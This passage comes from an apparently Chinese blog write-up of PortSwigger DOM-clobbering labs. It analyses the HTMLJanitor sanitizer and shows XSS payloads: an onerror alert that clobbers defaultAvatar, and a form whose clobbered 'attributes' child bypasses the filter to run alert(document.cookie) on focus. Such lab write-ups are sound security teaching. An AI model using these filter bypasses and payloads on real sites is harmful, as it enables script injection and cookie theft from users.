net::ERR_FILE_NOT_FOUND</code>&#x3002;</p><p>&#x8FD9;&#x6837;&#x8BC4;&#x8BBA;&#x4EE5;&#x540E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;&#x81EA;&#x5DF1;&#x7684;&#x8BC4;&#x8BBA;&#x5904;&#x770B;&#x5230;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;defaultAvatar&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;1:<span class="hljs-symbol">&amp;quot;</span>onerror=alert(1)//&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;avatar&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;defaultAvatar&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x518D;&#x968F;&#x4FBF;&#x8BC4;&#x8BBA;&#x4E00;&#x4E0B;&#x5C31;&#x597D;&#x4E86;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x89E6;&#x53D1;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x7684; XSS &#x4E86;&#x3002;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200226153957.png" alt></p><h3 id="Lab-Clobbering-DOM-attributes-to-bypass-HTML-filters"><a href="#Lab-Clobbering-DOM-attributes-to-bypass-HTML-filters" class="headerlink" title="Lab:Clobbering DOM attributes to bypass HTML filters"></a>Lab:Clobbering DOM attributes to bypass HTML filters</h3><blockquote><p>&#x200B;    This lab uses the HTMLJanitor library, which is vulnerable to <a href="https://portswigger.net/web-security/dom-based/dom-clobbering" target="_blank" rel="noopener">DOM clobbering</a>. To solve this lab, construct a vector that bypasses the filter and uses DOM clobbering to inject a vector that alerts document.cookie. You may need to use the exploit server in order to make your vector auto-execute in the victim&#x2019;s browser.</p><p>Note: The intended solution to this lab will not work in Firefox. We recommend using Chrome to complete this lab.</p></blockquote><p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x4E5F;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#xFF0C;&#x5728;<code>resources/js/loadCommentsWithHtmlJanitor.js</code>&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x4EE3;&#x7801;&#x5B89;&#x5168;&#x591A;&#x4E86;&#xFF0C;&#x6CA1;&#x6709;&#x660E;&#x663E;&#x7684;&#x76F4;&#x63A5;&#x7528;<code>Window.x</code>&#x8FD9;&#x79CD;&#x4EE3;&#x7801;&#x4E86;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">let</span> janitor = <span class="hljs-keyword">new</span> HTMLJanitor({<span class="hljs-attr">tags</span>: {<span class="hljs-attr">input</span>:{<span class="hljs-attr">name</span>:<span class="hljs-literal">true</span>,<span class="hljs-attr">type</span>:<span class="hljs-literal">true</span>,<span class="hljs-attr">value</span>:<span class="hljs-literal">true</span>},<span class="hljs-attr">form</span>:{<span class="hljs-attr">id</span>:<span class="hljs-literal">true</span>},<span class="hljs-attr">i</span>:{},<span class="hljs-attr">b</span>:{},<span class="hljs-attr">p</span>:{}}});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E00;&#x5F00;&#x59CB;&#x5C31;&#x521D;&#x59CB;&#x5316;&#x4E86;<code>HTMLJanitor</code>&#xFF0C;&#x53EA;&#x80FD;&#x4F7F;&#x7528;&#x521D;&#x59CB;&#x5316;&#x5185;&#x7684;&#x6807;&#x7B7E;&#x53CA;&#x5176;&#x5C5E;&#x6027;&#xFF0C;&#x5BF9;&#x4E8E;&#x91CD;&#x8981;&#x7684;&#x8F93;&#x5165;&#x8F93;&#x51FA;&#x5730;&#x65B9;&#x90FD;&#x4F7F;&#x7528;&#x4E86;<code>janitor.clean</code>&#x8FDB;&#x884C;&#x8FC7;&#x6EE4;&#x3002;&#x770B;&#x8D77;&#x6765;&#x6211;&#x4EEC;&#x6CA1;&#x529E;&#x6CD5;&#x5F88;&#x7B80;&#x5355;&#x5730;&#x8FDB;&#x884C; XSS &#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x5C31;&#x53EA;&#x80FD;&#x6765;&#x770B;&#x770B;<code>resources/js/htmlJanitor.js</code>&#x8FD9;&#x4E2A;&#x8FC7;&#x6EE4;&#x6587;&#x4EF6;&#x4E86;&#x3002;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTMLJanitor.prototype.clean = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">html</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">const</span> sandbox = <span class="hljs-built_in">document</span>.implementation.createHTMLDocument(<span class="hljs-string">&quot;&quot;</span>);</span><br><span class="line">  <span class="hljs-keyword">const</span> root = sandbox.createElement(<span class="hljs-string">&quot;div&quot;</span>);</span><br><span class="line">  root.innerHTML = html;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">this</span>._sanitize(sandbox, root);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> root.innerHTML;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x9996;&#x5148;&#x7528;<code>document.implementation.createHTMLDocument</code>&#x521B;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;&#x65B0;&#x7684; HTML &#x6587;&#x6863;&#x7528;&#x4F5C; sandbox &#xFF0C;&#x7136;&#x540E;&#x5BF9;&#x4E8E; sandbox &#x5185;&#x7684;&#x5143;&#x7D20;&#x8FDB;&#x884C;<code>_sanitize</code>&#x8FC7;&#x6EE4;&#x3002;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTMLJanitor.prototype._sanitize = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">document, parentNode</span>) </span>{</span><br><span class="line">truetrue<span class="hljs-keyword">var</span> treeWalker = createTreeWalker(<span class="hljs-built_in">document</span>, parentNode);</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;<code>_sanitize</code>&#x51FD;&#x6570;&#x4E00;&#x5F00;&#x59CB;&#x8C03;&#x7528;&#x4E86;<code>createTreeWalker</code>&#x51FD;&#x6570;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;<code>TreeWalker</code>&#xFF0C;&#x8FD9;&#x4E2A;&#x7C7B;&#x8868;&#x793A;&#x4E00;&#x4E2A;&#x5F53;&#x524D;&#x6587;&#x6863;&#x7684;&#x5B50;&#x6811;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x8282;&#x70B9;&#x53CA;&#x5176;&#x4F4D;&#x7F6E;&#x3002;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createTreeWalker</span>(<span class="hljs-params">document, node</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-built_in">document</span>.createTreeWalker(</span><br><span class="line">    node,</span><br><span class="line">    NodeFilter.SHOW_TEXT |</span><br><span class="line">    NodeFilter.SHOW_ELEMENT |</span><br><span class="line">    NodeFilter.SHOW_COMMENT,</span><br><span class="line">    <span class="hljs-literal">null</span>,</span><br><span class="line">    <span class="hljs-literal">false</span></span><br><span class="line">  );</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x7684;<code>node</code>&#x5373;&#x4E3A;&#x4E00;&#x5F00;&#x59CB;&#x7684;<code>root</code>&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x7684;<code>html</code>&#x4F1A;&#x5728;&#x4F20;&#x5165;&#x5230;<code>node</code>&#x53C2;&#x6570;&#xFF0C;<code>document</code>&#x5373;&#x4E3A;&#x4E00;&#x5F00;&#x59CB;&#x7684;<code>sandbox</code>&#xFF0C;&#x63A5;&#x7740;&#x8FDB;&#x5165;&#x5FAA;&#x73AF;&#x8FDB;&#x884C;&#x5224;&#x65AD;&#xFF0C;&#x5BF9;&#x4E8E;&#x6587;&#x672C;&#x5462;&#x7ED2;&#x4EE5;&#x53CA;&#x6CE8;&#x91CA;&#x8FDB;&#x884C;&#x5904;&#x7406;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (node.nodeType === Node.TEXT_NODE) {</span><br><span class="line">true<span class="hljs-comment">//&#x5982;&#x679C;&#x6B64;&#x6587;&#x672C;&#x8282;&#x70B9;&#x53EA;&#x662F;&#x7A7A;&#x767D;&#xFF0C;&#x5E76;&#x4E14;&#x4E0A;&#x4E00;&#x4E2A;&#x6216;&#x4E0B;&#x4E00;&#x4E2A;&#x5143;&#x7D20;&#x540C;&#x7EA7;&#x662F;`blockElement`&#xFF0C;&#x5219;&#x5C06;&#x5176;&#x5220;&#x9664;</span></span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">// &#x79FB;&#x9664;&#x6240;&#x6709;&#x7684;&#x6CE8;&#x91CA;</span></span><br><span class="line"><span class="hljs-keyword">if</span> (node.nodeType === Node.COMMENT_NODE) {</span><br><span class="line">  <span class="hljs-comment">//...</span></span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//&#x68C0;&#x67E5;`inlineElement`&#x4E2D;&#x662F;&#x5426;&#x8FD8;&#x6709;`BlockElement`</span></span><br><span class="line"><span class="hljs-keyword">var</span> isInline = isInlineElement(node);</span><br><span class="line"><span class="hljs-keyword">var</span> containsBlockElement;</span><br><span class="line"><span class="hljs-keyword">if</span> (isInline) {</span><br><span class="line">  containsBlockElement = <span class="hljs-built_in">Array</span>.prototype.some.call(</span><br><span class="line">    node.childNodes,</span><br><span class="line">    isBlockElement</span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"><span class="hljs-comment">//&#x68C0;&#x67E5;`BlockElement`&#x662F;&#x5426;&#x5D4C;&#x5957;</span></span><br><span class="line"><span class="hljs-keyword">var</span> isNotTopContainer = !!parentNode.parentNode;</span><br><span class="line"><span class="hljs-keyword">var</span> isNestedBlockElement =</span><br><span class="line">    isBlockElement(parentNode) &amp;&amp;</span><br><span class="line">    isBlockElement(node) &amp;&amp;</span><br><span class="line">    isNotTopContainer;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> nodeName = node.nodeName.toLowerCase();</span><br><span class="line"><span class="hljs-comment">//&#x83B7;&#x53D6;&#x5141;&#x8BB8;&#x4F7F;&#x7528;&#x7684;&#x5C5E;&#x6027;</span></span><br><span class="line"><span class="hljs-keyword">var</span> allowedAttrs = getAllowedAttrs(<span class="hljs-keyword">this</span>.config, nodeName, node);</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span> isInvalid = isInline &amp;&amp; containsBlockElement;</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//&#x6839;&#x636E;&#x767D;&#x540D;&#x5355;&#x5220;&#x9664;&#x6807;&#x7B7E;</span></span><br><span class="line"><span class="hljs-keyword">if</span> (</span><br><span class="line">  isInvalid ||</span><br><span class="line">  shouldRejectNode(node, allowedAttrs) ||</span><br><span class="line">  (!<span class="hljs-keyword">this</span>.config.keepNestedBlockElements &amp;&amp; isNestedBlockElement)</span><br><span class="line">) {</span><br><span class="line">  <span class="hljs-comment">// Do not keep the inner text of SCRIPT/STYLE elements.</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (</span><br><span class="line">    !(node.nodeName === <span class="hljs-string">&quot;SCRIPT&quot;</span> || node.nodeName === <span class="hljs-string">&quot;STYLE&quot;</span>)</span><br><span class="line">  ) {</span><br><span class="line">    <span class="hljs-keyword">while</span> (node.childNodes.length &gt; <span class="hljs-number">0</span>) {</span><br><span class="line">      parentNode.insertBefore(node.childNodes[<span class="hljs-number">0</span>], node);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  parentNode.removeChild(node);</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">this</span>._sanitize(<span class="hljs-built_in">document</span>, parentNode);</span><br><span class="line">  <span class="hljs-keyword">break</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6700;&#x540E;&#x770B;&#x5230;&#x503C;&#x5F97;&#x6211;&#x4EEC;&#x5173;&#x6CE8;&#x7684;&#x70B9;&#xFF1A;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">// Sanitize attributes</span></span><br><span class="line"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> a = <span class="hljs-number">0</span>; a &lt; node.attributes.length; a += <span class="hljs-number">1</span>) {</span><br><span class="line">  <span class="hljs-keyword">var</span> attr = node.attributes[a];</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (shouldRejectAttr(attr, allowedAttrs, node)) {</span><br><span class="line">    node.removeAttribute(attr.name);</span><br><span class="line">    <span class="hljs-comment">// Shift the array to continue looping.</span></span><br><span class="line">    a = a - <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// Sanitize children</span></span><br><span class="line"><span class="hljs-keyword">this</span>._sanitize(<span class="hljs-built_in">document</span>, node);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5728;&#x8FD9;&#x91CC;&#x6700;&#x7EC8;&#x5BF9;&#x6807;&#x7B7E;&#x7684;&#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x4E86; check &#xFF0C;&#x5BF9; node &#x7684;&#x6BCF;&#x4E2A;&#x5C5E;&#x6027;&#x90FD;&#x8FDB;&#x884C;&#x4E86;&#x767D;&#x540D;&#x5355;&#x68C0;&#x67E5;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shouldRejectAttr</span>(<span class="hljs-params">attr, allowedAttrs, node</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">var</span> attrName = attr.name.toLowerCase();</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (allowedAttrs === <span class="hljs-literal">true</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> allowedAttrs[attrName] === <span class="hljs-string">&quot;function&quot;</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> !allowedAttrs[attrName](attr.value, node);</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> allowedAttrs[attrName] === <span class="hljs-string">&quot;undefined&quot;</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (allowedAttrs[attrName] === <span class="hljs-literal">false</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> allowedAttrs[attrName] === <span class="hljs-string">&quot;string&quot;</span>) {</span><br><span class="line">    <span class="hljs-keyword">return</span> allowedAttrs[attrName] !== attr.value;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x679C;&#x53D1;&#x73B0;&#x6709;&#x4E0D;&#x5728;&#x767D;&#x540D;&#x5355;&#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x4F1A;&#x4F7F;&#x7528;<code>node.removeAttribute(attr.name);</code>&#x8FDB;&#x884C;&#x5220;&#x9664;&#xFF0C;&#x7136;&#x540E;&#x5BF9;&#x5B50;&#x8282;&#x70B9;&#x8FDB;&#x884C;&#x9012;&#x5F52;<code>_sanitize</code>&#x3002;&#x6240;&#x4EE5;&#x6709;&#x4E24;&#x4E2A;&#x601D;&#x8DEF;&#xFF0C;&#x8981;&#x4E48;&#x7ED5;&#x6807;&#x7B7E;&#x8FC7;&#x6EE4;&#xFF0C;&#x8981;&#x4E48;&#x7ED5;&#x8282;&#x70B9;&#x5C5E;&#x6027;&#x8FC7;&#x6EE4;&#x3002;</p><p>&#x6807;&#x7B7E;&#x7684;&#x83B7;&#x53D6;&#x7531;<code>treeWalker.firstChild();</code>&#x5F97;&#x5230;&#xFF0C;&#x8FC7;&#x6EE4;&#x7531;<code>getAllowedAttrs</code>&#x4EE5;&#x53CA;<code>shouldRejectNode</code>&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#x8FDB;&#x884C;&#xFF0C;&#x7531;&#x4E8E;&#x8FD9;&#x91CC;&#x7684;&#x8FC7;&#x6EE4;&#x662F;&#x8FDB;&#x884C;&#x767D;&#x540D;&#x5355;&#x8FC7;&#x6EE4;&#xFF0C;&#x6CA1;&#x4EC0;&#x4E48;&#x529E;&#x6CD5;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#xFF1B;&#x5C5E;&#x6027;&#x7684;&#x83B7;&#x53D6;&#x5728;&#x4E00;&#x4E2A;<code>for</code>&#x5FAA;&#x73AF;&#x5F53;&#x4E2D;&#xFF0C;&#x6761;&#x4EF6;&#x662F;<code>node.attributes.length</code>&#xFF0C;&#x83B7;&#x53D6;&#x65B9;&#x5F0F;&#x662F;<code>node.attributes[a]</code>&#xFF0C;&#x8FC7;&#x6EE4;&#x7531;<code>shouldRejectAttr</code>&#x65B9;&#x6CD5;&#x8FDB;&#x884C;&#x3002;</p><p>&#x5BF9; Dom Clobbering &#x6BD4;&#x8F83;&#x654F;&#x611F;&#x7684;&#x540C;&#x5B66;&#x53EF;&#x80FD;&#x4F1A;&#x6CE8;&#x610F;&#x5230;&#x8FD9;&#x91CC;&#xFF0C;&#x5BF9;&#x4E8E; node &#x5C5E;&#x6027;&#x8FC7;&#x6EE4;&#x65F6;&#x7684;<code>for</code>&#x5FAA;&#x73AF;&#x6761;&#x4EF6;&#xFF0C;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x4E86;<code>node.attributes.length</code>&#xFF0C;&#x5018;&#x82E5;&#x6211;&#x4EEC;&#x6784;&#x9020;&#x7684;&#x8282;&#x70B9;&#x6B63;&#x597D;&#x6709;&#x4E00;&#x4E2A;<code>attributes</code>&#x5B50;&#x8282;&#x70B9;&#x4F1A;&#x600E;&#x4E48;&#x6837;&#x5462;&#xFF1F;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">img</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">var</span> node = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(node.attributes);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> a = <span class="hljs-number">0</span>; a &lt; node.attributes.length; a++) {</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">console</span>.log(node.attributes[a]);</span></span><br><span class="line">  }</span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&apos;finished&apos;</span>);</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4EE5;&#x4E0A;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x4F1A;&#x8F93;&#x51FA;&#x4E00;&#x4E2A;<code>NamedNodeMap</code>&#x5BF9;&#x8C61;&#xFF0C;<code>id=&apos;x&apos;</code>&#x4EE5;&#x53CA; finished</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span>&gt;</span></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">name</span>=<span class="hljs-string">attributes</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">var</span> node = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&apos;x&apos;</span>);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(node.attributes);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> a = <span class="hljs-number">0</span>; a &lt; node.attributes.length; a++) {</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">console</span>.log(node.attributes[a]);</span></span><br><span class="line">  }</span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&apos;finished&apos;</span>);</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4EE5;&#x4E0A;&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x4F1A;&#x8F93;&#x51FA;<code>&lt;img name=attributes&gt;</code>&#x4EE5;&#x53CA; finished &#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6211;&#x4EEC;&#x4F7F;&#x7528;<code>name=attributes</code>&#x6210;&#x529F;&#x5730;&#x8986;&#x76D6;&#x4E86;&#x539F;&#x6765;&#x7684;<code>node.attributes</code>&#xFF0C;&#x6240;&#x4EE5;<code>node.attributes.length</code>&#x5728;&#x8FD9;&#x91CC;&#x7684;&#x503C;&#x4E3A;<code>undefined</code>&#xFF0C;&#x5E76;&#x4E14;&#x4E5F;&#x6CA1;&#x6709;&#x5F71;&#x54CD; JS &#x4EE3;&#x7801;&#x7684;&#x7EE7;&#x7EED;&#x8FD0;&#x884C;&#x3002;</p><p>&#x6240;&#x4EE5;&#x660E;&#x767D;&#x4E86;&#x8FD9;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x5305;&#x542B;&#x6709;<code>name=attributes</code>&#x7684;&#x5B50;&#x8282;&#x70B9;&#x7684; payload &#x7ED5;&#x8FC7;&#x5C5E;&#x6027;&#x7684; check &#xFF0C;&#x8FD9;&#x91CC;&#x7ED9;&#x5B9A;&#x7684;&#x767D;&#x540D;&#x5355;&#x6807;&#x7B7E;&#x4E5F;&#x6BD4;&#x8F83;&#x660E;&#x663E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; HTML Relationships &#x6765;&#x6784;&#x9020;&#x6211;&#x4EEC;&#x7684; payload</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> &gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">attributes</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x63A5;&#x7740;&#x5C31;&#x662F;&#x6784;&#x9020; XSS &#x4E86;&#xFF0C;&#x6839;&#x636E;&#x9898;&#x76EE;&#x8981;&#x6C42;&#xFF0C;&#x9700;&#x8981;&#x7528;&#x6237;&#x8BBF;&#x95EE;&#x89E6;&#x53D1;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5229;&#x7528;<code>tabindex</code>&#x5C5E;&#x6027;&#xFF0C;&#x914D;&#x5408;<code>form</code>&#x7684;<code>onfocus</code>&#x65F6;&#x95F4;&#x6765; XSS &#x3002;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">x</span> <span class="hljs-attr">tabindex</span>=<span class="hljs-string">0</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert(document.cookie)</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">attributes</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x628A;&#x5B83;&#x5F53;&#x4F5C;&#x8BC4;&#x8BBA;&#x63D0;&#x4EA4;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200227152312.png" alt></p><p>&#x4F46;&#x662F;&#x5982;&#x679C;&#x76F4;&#x63A5;&#x4EA4;&#x7ED9;&#x7528;&#x6237;&#x70B9;&#x51FB;&#x7684;&#x8BDD;&#x662F;&#x4E0D;&#x4F1A;&#x89E6;&#x53D1;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x8BC4;&#x8BBA;&#x662F;&#x7531; aJax 